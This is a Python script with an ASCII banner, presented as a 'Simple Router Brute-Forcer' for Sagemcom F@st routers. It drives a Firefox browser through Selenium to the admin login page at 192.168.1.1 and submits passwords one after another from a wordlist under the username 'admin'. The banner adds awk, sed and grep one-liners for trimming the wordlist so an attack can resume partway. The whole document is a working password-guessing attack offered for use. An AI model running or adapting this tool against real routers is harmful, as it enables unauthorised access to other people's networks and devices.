print(r"""
                                (          (       )                  (     
     )        *   ) (  (      ))\ )     ) )\ ) ( /(         *   )    )\ )  
  ( /(    ( ` )  /( )\))(  ( /(()/(  ( /((()/( )\())    ( ` )  /((  (()/(  
  )\())   )\ ( )(_)|(_)()\ )\())(_)) )\())/(_)|(_)\     )\ ( )(_))\  /(_)) 
 ((_)\ _ ((_|_(_()) (()((_|(_)(_))_ ((_)\(_))   ((_) _ ((_|_(_()|(_)(_))   
 /  (_) | | |_   _|| __| / (_)   \__ (_) _ \ / _ \| | | |_   _| __| _ \  
| () || |_| | | |  |__ \ | | | |) |_ \ |   /| (_) | |_| | | | | _||   /  
 \__/  \___/  |_|  |___/ |_| |___/___/ |_|_\ \___/ \___/  |_| |___|_|_\
 ---------------------------------------------------------------------
|  > Simple Router Brute-Forcer. Use with new Sagem F@st, and other.  |
|  > Example: Sagemcom F@st 5655, 5670                                |
|  > Out of order the time limited webpages, don't use!               |   
 ---------------------------------------------------------------------
    """)
print(r"""
 ---------------------------------------------------------------------------------------------------------------
| 1: numbers in a row  | 2: up to a specified number/string, with pre-value  | 3: attempt lines number/string   |
 ---------------------------------------------------------------------------------------------------------------
| 1 sudo awk '$0 >= 20000000 && $0 <= 80000000 {next;}{print}' /root/Desktop/8-03.txt > /root/Desktop/8-02.txt  |
 ---------------------------------------------------------------------------------------------------------------
| 2 grep -A 99999999 -B 4 "74145678" /root/Desktop/test_dict.txt > /root/Desktop/test_dict02.txt | recommended! |
 ---------------------------------------------------------------------------------------------------------------
|   sed -n '25,99999999p' -i /root/Desktop/test_dict_03.txt | owerrite file, just attempt number, and pre-value |
|   ------------------------------------------------------------------------------------------------------------
| 3 sed -n '25,99999999p' /root/Desktop/test_dict.txt > /root/Desktop/test_dict02.txt | +attempt value number   |
|   --------------------------------------------------------------------------------- | and -4 due to pre-value |
|   tail -n +25 /root/Desktop/test_dict02.txt > /root/Desktop/test_dict_03.txt        | alway everything prev.! |
 ---------------------------------------------------------------------------------------------------------------
    """)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
from selenium import webdriver
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options

# Options
options = Options()

## Enable headless
options.headless = False

# Specify custom geckodriver path
service = Service("/usr/local/bin/geckodriver")

# Test
tarayici=webdriver.Firefox(options=options, service=service)


tarayici.get("http://192.168.1.1/")
time.sleep(2)


azonosito=tarayici.find_element_by_id("name")
jelszo=tarayici.find_element_by_id("password")
giris=tarayici.find_element_by_id("button-blue")

# Python program to
# demonstrate readline()

# Using readlines()
dosya=open("/root/Desktop/test_dict_03.txt","r")
Lines=dosya.readlines()

count=0
# Strips the newline character
for line in Lines:
    count+=1
    azonosito.send_keys("admin")
    jelszo.send_keys(line)
    time.sleep(3)
    print("Attempt {}: {}".format(count,line.strip()))
    giris.click()
    azonosito.clear()

dosya.close()
